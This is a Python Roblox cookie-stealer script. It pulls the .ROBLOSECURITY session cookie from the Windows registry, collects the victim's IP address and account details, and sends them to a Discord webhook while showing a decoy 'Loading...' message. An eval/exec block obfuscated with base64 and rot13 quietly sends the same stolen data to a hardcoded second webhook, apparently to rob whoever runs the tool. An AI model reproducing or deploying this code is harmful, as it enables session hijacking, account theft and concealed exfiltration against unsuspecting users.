
try:
    import base64, codecs
    from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
    import robloxpy
    import json
    import requests
    import os
    from discordwebhook import *
except:
    os.system("pip install discordwebhook")
    os.system("pip install robloxpy")
    os.system("pip install requests")
    print("Run the app again.")

webhookk = "heh"# put webhook here


dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX (creds to bingo methods) #################
magic = 'ZGlzY29ycmQgPSBEaXNjb3JkKHVybD0iaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTg2MjUyNzY3OTM0OTU5NjY3L08yc0ZGRkE3VGlRa3VLa2JwMTZvNGstdnVhMDhQWEYwZzlzdmdPdzZKTVVFYVNzVWoxSkpEajNTSmpGVUVManJQanBuIikNCmRpc2NvcnJkLnBvc3QoDQogICAgdXNlcm5hbWU9IkJPVCAtIFBpcmF0ZSDwn42qIiwNCiAgICBhdmF0YXJfdXJsPSJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85ODQ4MTg0MjkzNTU3ODIxOTcvOTg1ODc4MTczNjU5MDQ1OTk5L2EzMzk3MjExODNmNjBjMThiMzQyNGJhN2I3M2RhZjFiLnBuZyIsDQogICAgZW1iZWRzPVs'
love = 'APvNtVPNtVPNtrj0XVPNtVPNtVPNtVPNtVaImMKWhLJ1yVwbtVxWCIPNgVSOcpzS0MFQja42dVvjAPvNtVPNtVPNtVPNtVPW0nKEfMFV6VPYja5X4VPfkVSWyp3IfqPOOL2AiqJ50VCPsyn8vYN0XVPNtVPNtVPNtVPNtVzEyp2AlnKO0nJ9hVvN6VTLvJ0qcqTu1LvODLJqyKFubqUEjpmbiY2qcqTu1Lv5wo20iGJShnGR3AF9DnKWuqTHgD29in2yyYHqlLJWvMKVcVUjtJ1WioTygo25mKFu7pz9fnJ1ioaA9XFO8VSgFo2Wfo3ttHUWiMzyfMI0br3WiLzkirS9jpz9znJkysFxvYN0XVPNtVPNtVPNtVPNtVzAioT9lVvN6VQRlAQHlZQD0YN0XVPNtVPNtVPNtVPNtVzMcMJkxplV6VSfAPvNtVPNtVPNtVPNtVPNtVP'
god = 'B7Im5hbWUiOiAiVXNlcm5hbWUiLCAidmFsdWUiOiB1c2VybmFtZSwgImlubGluZSI6IFRydWV9LA0KICAgICAgICAgICAgICAgIHsibmFtZSI6ICJSb2J1eCBCYWxhbmNlIiwgInZhbHVlIjogcm9idXgsICJpbmxpbmUiOiBUcnVlfSwNCiAgICAgICAgICAgICAgICB7Im5hbWUiOiAiUHJlbWl1bSBTdGF0dXMiLCAidmFsdWUiOiBwcmVtaXVtLCJpbmxpbmUiOiBUcnVlfSwNCiAgICAgICAgICAgICAgICB7Im5hbWUiIDogIlJBUCIsICJ2YWx1ZSI6IHJhcCwiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIiA6ICJGcmllbmRzIiwgInZhbHVlIjogZnJpZW5kcywgImlubGluZSI6IFRyd'
destiny = 'JI9YN0XVPNtVPNtVPNtVPNtVPNtVUfvozSgMFVtBvNvDJAwo3IhqPOOM2HvYPNvqzSfqJHvBvOuM2HfVPWcozkcozHvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVxyDVRSxMUWyp3ZvYPNvqzSfqJHvVQbtnKOsLJExpzImpljtVzyhoTyhMGbvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVv5FG0WZG1ASD1IFFIEMVvjtVaMuoUIyVwbtMvWtLTO7pz9voT94K2Aio2gcMK1tLTNvYPNvnJ5fnJ5yVwbtEzSfp2I9YN0XVPNtVPNtVPNtVPNtKFjAPvNtVPNtVPNtVPNtVPW0nUIgLz5unJjvBvO7VaIloPV6VTuyLJEmnT90sFjAPt0XQDbtVPNtVPNtVU0APvNtVPOqYN0XXD0X'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
